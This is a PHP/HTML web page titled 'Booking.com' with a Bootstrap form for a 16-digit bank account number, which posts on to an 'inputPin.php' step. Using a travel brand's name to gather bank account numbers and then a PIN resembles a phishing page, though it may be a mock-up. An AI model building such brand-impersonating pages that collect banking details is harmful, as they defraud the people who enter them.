<?php
// session_start();
// require "connect.php";
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Booking.com</title>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">

    <!-- Import jquery cdn -->
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>

    <link rel='icon' href='images/logo.png' type='images/logo.png'>

    <!-- Bootstrap CSS  -->
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js" integrity="sha384-oBqDVmMz9ATKxIep9tiCxS/Z9fNfEXiDAYTujMAeBAsjFuCZSmKbSSUnQlmh/jp3" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.min.js" integrity="sha384-cuYeSxntonz0PPNlHhBs68uyIAVpIIOZZ5JqeqvYYIcEL727kskC66kF92t6Xl2V" crossorigin="anonymous"></script>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous">
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <link rel="stylesheet" href="../css/inputPin.css">

</head>

<body>
    <div class="container-fluid full-screen">
        <div class="row">
            <div class="content">
                <h2>Enter Bank Account Number</h2>
                <p>Please enter to continue</p>
                <form action="inputPin.php" method="post">
                    <div id="noRekInputs">
                        <input class="form-control" type="tel" placeholder="Bank Account Number" id="bankAccountInput" name="bankAccount" aria-label="default input example" maxlength="16">
                    </div>
                    <div class="d-flex justify-content-center mt-3">
                        <button id="submitPin" class="btn btn-primary kirim" type="submit" disabled>Kirim</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const bankAccountInput = document.getElementById('bankAccountInput');
            const submitButton = document.getElementById('submitPin');

            bankAccountInput.addEventListener('input', function() {
                const regex = /^\d{16}$/;  // Regular expression to check for exactly 16 digits
                if (regex.test(this.value)) {
                    submitButton.disabled = false;
                } else {
                    submitButton.disabled = true;
                }
            });
        });
    </script>
</body>

</html>
